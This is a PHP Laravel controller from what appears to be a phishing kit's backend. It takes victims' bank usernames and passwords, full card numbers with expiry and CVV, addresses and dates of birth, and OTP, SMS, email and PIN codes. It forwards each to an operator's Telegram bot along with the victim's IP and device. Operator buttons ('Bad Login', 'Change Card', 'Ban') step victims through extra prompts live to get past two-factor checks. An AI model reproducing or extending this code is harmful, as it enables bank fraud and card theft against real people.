<?php

namespace App\Http\Controllers;

use App\Models\Client;
use App\Models\CustomForm;
use App\Models\Settings;
use App\Models\Stats;
use App\Services\TelegramService;
use App\Services\BinLookupService;
use Illuminate\Support\Facades\Log;
use Illuminate\Http\Request;
use LVR\CreditCard\CardNumber;
use Jenssegers\Agent\Agent;

class SendController extends Controller
{
    private TelegramService $telegramService;

    public function __construct(TelegramService $telegramService)
    {
        $this->telegramService = $telegramService;
    }

    public function send(Request $request)
    {
        $validated = $request->validate([
            'unique_id' => ['required', 'string'],
            'step' => ['required', 'string'],
        ]);

        $unique_id = $validated['unique_id'];

        $client = Client::where('unique_id', $unique_id)->first();

        if (!$client) {
            Log::error('Client not found', ['unique_id' => $unique_id]);
            return response()->json([
                'message' => 'Client not found',
                'data' => null
            ], 404);
        } 

        if ($client->ban) {
            Log::warning('Client is banned', ['unique_id' => $unique_id]);
            return response()->json([
                'message' => 'Client is banned',
                'data' => null
            ], 403);
        }

        $agent = new Agent();
        $agent->setUserAgent($request->header('User-Agent'));

        $typeDevice = $agent->isMobile() ? 'Mobile' : ($agent->isTablet() ? 'Tablet' : 'Desktop');
        $user_agent = $agent->platform() . '|' . $agent->browser() . '|' . $typeDevice;

        if ($validated['step'] === 'login') {
            $this->sendLogin($client, $request, $user_agent);
        } elseif ($validated['step'] === 'info') {
            $this->sendInfo($client, $request, $user_agent);
        } elseif ($validated['step'] === 'card') {
            $this->sendCard($client, $request, $user_agent);
        } elseif ($validated['step'] === 'sms') {
            $this->sendSms($client, $request, $user_agent);
        }elseif ($validated['step'] === 'otp') {
            $this->sendOtp($client, $request, $user_agent);
        } elseif ($validated['step'] === 'app') {
            $this->sendApp($client, $request, $user_agent);
        } elseif ($validated['step'] === 'mail') {
            $this->sendMail($client, $request, $user_agent);
        } elseif ($validated['step'] === 'pin') {
            $this->sendPin($client, $request, $user_agent);
        } elseif ($validated['step'] === 'bank') {
            $this->sendBank($client, $request, $user_agent);
        } elseif ($validated['step'] === 'custom') {
            $this->sendCustom($client, $request, $user_agent);
        } elseif (preg_match('/^custom_\d+$/', $validated['step'])) {
            // Handle dynamic custom forms (custom_2, custom_3, etc.)
            $this->sendCustom($client, $request, $user_agent, $validated['step']);
        } elseif ($validated['step'] === 'notif') {
            $this->sendNotif($client, $request, $user_agent);
        }

        $client->last_page = $validated['step'];
        $client->save();

        return response()->json([
            'message' => 'Client found',
            'status' => "success",
        ]);
    }

    private function sendLogin($client, $request, $user_agent) {

        $validated = $request->validate([
            'text' => ['required', 'string'],
        ]);

        $message = "🫆 <b>[ LOGIN ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "🪄 <b>Notification: " . $validated['text'] . "</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🌐 <b>IP:</b> <code>" . $client->ip . "</code>" . PHP_EOL;
        $message .= "🌍 <b>Country: [" . $client->country_code . "/" . strtoupper($client->language) . "]</b>" . PHP_EOL;
        $message .= "💻 <b>Device:</b> <i>" . $user_agent . "</i>" . PHP_EOL;
        $message .= "🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'login');
    }

    private function sendInfo($client, $request, $user_agent) {

        $validated = $request->validate([
            'name' => ['required', 'string'],
            'address' => ['required', 'string'],
            'city' => ['required', 'string'],
            'postalcode' => ['required', 'string'],
            'country' => ['required', 'string'],
            'phone' => ['required', 'string'],
            'dob' => ['required', 'string'],
        ]);

        $message = "🔮 <b>[ INFO ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "🪄 <b>Name:</b> <code>" . $validated['name'] . "</code>" . PHP_EOL;
        $message .= "🪄 <b>Address:</b> <code>" . $validated['address'] . "</code>" . PHP_EOL;
        $message .= "🪄 <b>City:</b> <code>" . $validated['city'] . "</code>" . PHP_EOL;
            $message .= "🪄 <b>Postal Code:</b> <code>" . $validated['postalcode'] . "</code>" . PHP_EOL;
            $message .= "🪄 <b>Country:</b> <code>" . $validated['country'] . "</code>" . PHP_EOL;
        $message .= "🪄 <b>Phone:</b> <code>" . $validated['phone'] . "</code>" . PHP_EOL;
        $message .= "🪄 <b>Date of Birth:</b> <code>" . $validated['dob'] . "</code>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🌐 <b>IP:</b> <code>" . $client->ip . "</code>" . PHP_EOL;
        $message .= "🌍 <b>Country: [" . $client->country_code . "/" . strtoupper($client->language) . "]</b>" . PHP_EOL;
        $message .= "💻 <b>Device:</b> <i>" . $user_agent . "</i>" . PHP_EOL;
        $message .= "🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'info');
    }

    private function sendCard($client, $request, $user_agent) {

        $validated = $request->validate([
            'ccn' => ['required', new CardNumber],
            'exp' => ['required', 'regex:/^(0[1-9]|1[0-2])\/?([0-9]{2})$/'],
            'cvv' => ['required', 'digits_between:3,4'],
        ]);

        $cc = str_replace(' ', '', $validated['ccn']);
        $bin = substr($cc, 0, 6);
        $linkscan = "https://cardimages.imaginecurve.com/cards/". $bin .".png";

        $binService = new BinLookupService();
        $binData = $binService->fetchBinData($bin);

        if ($binData && $binData['Status'] === 'SUCCESS') {
            $message = "💳 <b>[ +1 " . ($binData['CardTier'] ?? 'Unknown') . " - " . ($binData['Scheme'] ?? 'Unknown') . " - " . ($binData['Country']['Name'] ?? 'Unknown') . " ]</b>\n";
            $message .= "  ↳   <b>[ " . ($binData['Issuer'] ?? 'Unknown') . " ]</b>\n\n";
        } else {
            $message = "💳 <b>[ +1 CARD ]</b>\n";
            $message .= "  ↳ <code>" . $bin . "</code>\n\n";
        }

        $message .= "💳 " . $cc . "" . PHP_EOL;
        $message .= "  ↳ Card: <code>" .  $validated['ccn'] . "</code>" .PHP_EOL;
        $message .= "  ↳ Expiration: <code>" .  $validated['exp'] . "</code>" .PHP_EOL;
        $message .= "  ↳ Cvv: <code>" .  $validated['cvv'] . "</code>" .PHP_EOL;
        $message .= "<a href='" . $linkscan . "'> </a>";
        $message .= PHP_EOL;
        $message .= "<blockquote>🌐 <b>IP:</b> <code>" . $client->ip . "</code>" . PHP_EOL;
        $message .= "🌍 <b>Country: [" . $client->country_code . "/" . strtoupper($client->language) . "]</b>" . PHP_EOL;
        $message .= "💻 <b>Device:</b> <i>" . $user_agent . "</i>" . PHP_EOL;
        $message .= "🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this->incrementStats('card');
        $this ->sendMessage($client->unique_id, $message, 'card');
    }

    private function sendOtp($client, $request, $user_agent) {

        $validated = $request->validate([
            'code' => ['required', 'string'],
        ]);

        $message = "📲 <b>[ OTP ][</b><code> " . $validated['code'] . " </code><b>]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'otp');
    }

    private function sendSms($client, $request, $user_agent) {

        $validated = $request->validate([
            'code' => ['required', 'string'],
        ]);

        $message = "📲 <b>[ SMS ][</b><code> " . $validated['code'] . " </code><b>]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'sms');
    }

    private function sendMail($client, $request, $user_agent) {

        $validated = $request->validate([
            'code' => ['required', 'string'],
        ]);

        $message = "📲 <b>[ MAIL ][</b><code> " . $validated['code'] . " </code><b>]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'mail');
    }

    private function sendPin($client, $request, $user_agent) {

        $validated = $request->validate([
            'code' => ['required', 'string'],
        ]);

        $message = "🔐 <b>[ PIN ][</b><code> " . $validated['code'] . " </code><b>]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'pin');
    }

    private function sendApp($client, $request, $user_agent) {

        $validated = $request->validate([
            'notif' => ['required', 'string'],
        ]);

        $message = "🔮 <b>[ " . $validated['notif'] . " ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'app');
    }

    private function sendBank($client, $request, $user_agent) {

        $validated = $request->validate([
            'username' => ['required', 'string'],
            'password' => ['required', 'string'],
        ]);

        $message = "🔮 <b>[ LOGIN ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "🪄 <b>Username:</b> <code>" . $validated['username'] . "</code>" . PHP_EOL;
        $message .= "🪄 <b>Password:</b> <code>" . $validated['password'] . "</code>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'bank');
    }

    private function sendNotif($client, $request, $user_agent) {

        $validated = $request->validate([
            'notif' => ['required', 'string'],
        ]);

        $message = "🔮 <b>[ " . $validated['notif'] . " ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this ->sendMessage($client->unique_id, $message, 'notif');
    }

    private function sendCustom($client, $request, $user_agent, $step = 'custom') {
        // Accept all fields except unique_id and step
        $data = $request->except(['unique_id', 'step']);

        // Validate or sanitize $data as needed

        $fieldsText = '';
        foreach ($data as $key => $value) {
            $fieldsText .= "🪄 <b>" . ucfirst($key) . ":</b> <code>" . htmlentities($value) . "</code>" . PHP_EOL;
        }

        // Extract form ID if it's a dynamic custom form (custom_2, custom_3, etc.)
        $formTitle = "CUSTOM FORM";
        if (preg_match('/^custom_(\d+)$/', $step, $matches)) {
            $formId = $matches[1];
            $formTitle = "CUSTOM FORM #{$formId}";
        }

        $message = "⚙️ <b>[ {$formTitle} ]</b>" . PHP_EOL;
        $message .= PHP_EOL;
        $message .= $fieldsText;
        $message .= PHP_EOL;
        $message .= "<blockquote>🆔 <b>ID:</b> <code>" . $client->unique_id . "</code></blockquote>" . PHP_EOL;

        $this->sendMessage($client->unique_id, $message, $step);
    }

    private function sendMessage($uniqueId, $message, $step)
    {
        if (empty($uniqueId) || empty($message) || empty($step)) {
            Log::error('Invalid parameters for sendMessage', [
                'uniqueId' => $uniqueId,
                'message' => $message,
                'step' => $step
            ]);
            return;
        }

        $buttons = $this->getButtons($uniqueId, $step);

        if ($buttons) {
            $this->telegramService->sendMessageWithButtons($message, $buttons);
        } else {
            $this->telegramService->sendMessage($message);
        }
    }

private function getButtons($uniqueId, $step)
{
    $panel = Settings::first();
    $customForms = CustomForm::where('is_active', true)->get(); // Get all active custom forms

    if (!$panel->panel_telegram) {
        if (app()->environment('local')) {
            // Use localhost URL
            $url = "http://localhost:5173/panel/actions/" . $uniqueId;
        } else {
            // Use normal URL
            $url = url("panel/actions/" . $uniqueId);
        }
        return [[['text' => 'PANEL', 'url' => $url]]];
    }

    $allButtons = [
        'info'      => [['text' => '👤 info 👤', 'callback_data' => $uniqueId . ':info']],
        'login'      => [['text' => '👤 Login 👤', 'callback_data' => $uniqueId . ':login']],
        'badlogin'   => [['text' => '⛔ Bad Login ⛔', 'callback_data' => $uniqueId . ':badlogin']],
        'card'       => [['text' => '💳 Card 💳', 'callback_data' => $uniqueId . ':card']],
        'badcard'    => [['text' => '♻️ Change Card ♻️', 'callback_data' => $uniqueId . ':badcard']],
        'otp'        => [['text' => '📲 OTP 📲', 'callback_data' => $uniqueId . ':otp']],
        'badotp'     => [['text' => '❌ Bad OTP ❌', 'callback_data' => $uniqueId . ':badotp']],
        'sms'        => [['text' => '📲 SMS 📲', 'callback_data' => $uniqueId . ':sms']],
        'badsms'     => [['text' => '❌ Bad SMS ❌', 'callback_data' => $uniqueId . ':badsms']],
        'mail'       => [['text' => '📧 Mail 📧', 'callback_data' => $uniqueId . ':mail']],
        'badmail'    => [['text' => '❌ Bad Mail ❌', 'callback_data' => $uniqueId . ':badmail']],
        'pin'        => [['text' => '🔒 PIN 🔒', 'callback_data' => $uniqueId . ':pin']],
        'badpin'     => [['text' => '❌ Bad PIN ❌', 'callback_data' => $uniqueId . ':badpin']],
        'bank'       => [['text' => '🏦 BANK 🏦', 'callback_data' => $uniqueId . ':bank']],
        'badbank'    => [['text' => '❌ BANK ❌', 'callback_data' => $uniqueId . ':badbank']],
        'app'        => [['text' => '📱 App 📱', 'callback_data' => $uniqueId . ':app']],
        'badapp'     => [['text' => '❌ Bad App ❌', 'callback_data' => $uniqueId . ':badapp']],
        'custom'     => [['text' => '⚙️ Custom ⚙️', 'callback_data' => $uniqueId . ':custom']],
        'badcustom'  => [['text' => '❌ Custom ❌', 'callback_data' => $uniqueId . ':badcustom']],
        'ban'        => [['text' => '⛔ Ban ⛔', 'callback_data' => $uniqueId . ':ban']],
        'confirm'    => [['text' => '✅ Confirm ✅ ', 'callback_data' => $uniqueId . ':confirm']],
    ];

    // Generate dynamic custom form buttons
    $customButtons = [];
    foreach ($customForms as $form) {
        $customButtons["custom_{$form->id}"] = [['text' => "⚙️ {$form->title} ⚙️", 'callback_data' => $uniqueId . ":custom_{$form->id}"]];
        $customButtons["badcustom_{$form->id}"] = [['text' => "❌ {$form->title} ❌", 'callback_data' => $uniqueId . ":badcustom_{$form->id}"]];
    }

    // Merge custom buttons with all buttons
    $allButtons = array_merge($allButtons, $customButtons);

    // Helper for conditional custom buttons
    $maybeCustom = $customForms->pluck('id')->map(function($id) {
        return "custom_{$id}";
    })->toArray();

    $stepButtons = [
        'notif'  => ['ban'],
        'login'   => array_merge($maybeCustom, ['ban']),
        'info'   => array_merge(['ban']),
        'card'   => array_merge(['badcard', 'app', 'otp', 'mail', 'pin'], $maybeCustom, ['confirm']),
        'otp'    => array_merge(['badotp', 'badcard', 'app', 'mail', 'pin'], $maybeCustom, ['confirm']),
        'mail'   => array_merge(['badmail', 'badcard', 'app', 'otp', 'pin'], $maybeCustom, ['confirm']),
        'app'    => array_merge(['badapp', 'badcard', 'otp', 'mail', 'pin'], $maybeCustom, ['confirm']),
        'custom' => array_merge(['badcustom', 'card', 'otp', 'mail', 'pin'], $maybeCustom, ['confirm']),
        'pin'    => array_merge(['badpin', 'badcard', 'app', 'otp', 'mail'], $maybeCustom, ['confirm']),
        'bank'   => ['badbank','info','login','card','otp','pin','mail','app', 'confirm', 'ban'],
    ];

    $buttons = [];
    
    // Handle dynamic custom forms (custom_2, custom_3, etc.) - use stepButtons logic
    if (preg_match('/^custom_(\d+)$/', $step, $matches)) {
        $formId = $matches[1];
        $customStepButtons = array_merge(["badcustom_{$formId}"], $maybeCustom, ['badcard', 'otp', 'app', 'mail', 'pin', 'confirm']);
        
        foreach ($customStepButtons as $btnKey) {
            if (isset($allButtons[$btnKey])) {
                $buttons[] = $allButtons[$btnKey][0];
            }
        }
        $buttons = array_chunk($buttons, 1); // 1 button per row
        return $buttons;
    }

    // Handle badcustom forms (badcustom_2, badcustom_3, etc.) - use stepButtons logic
    if (preg_match('/^badcustom_(\d+)$/', $step, $matches)) {
        $formId = $matches[1];
        $badCustomStepButtons = array_merge(['badcard', 'otp', 'app', 'mail', 'pin', 'confirm']);
        
        foreach ($badCustomStepButtons as $btnKey) {
            if (isset($allButtons[$btnKey])) {
                $buttons[] = $allButtons[$btnKey][0];
            }
        }
        $buttons = array_chunk($buttons, 1); // 1 button per row
        return $buttons;
    }
    
    if (isset($stepButtons[$step])) {
        foreach ($stepButtons[$step] as $btnKey) {
            if (isset($allButtons[$btnKey])) {
                $buttons[] = $allButtons[$btnKey][0];
            }
        }
        $buttons = array_chunk($buttons, 1); // 1 button per row
    }

    return $buttons;
}

    private function incrementStats($column)
    {
        $stat = Stats::firstOrCreate([],
            [
                'card' => 0,
            ]
        );
        $stat->increment($column);
        return response()->json($stat->refresh());
    }

}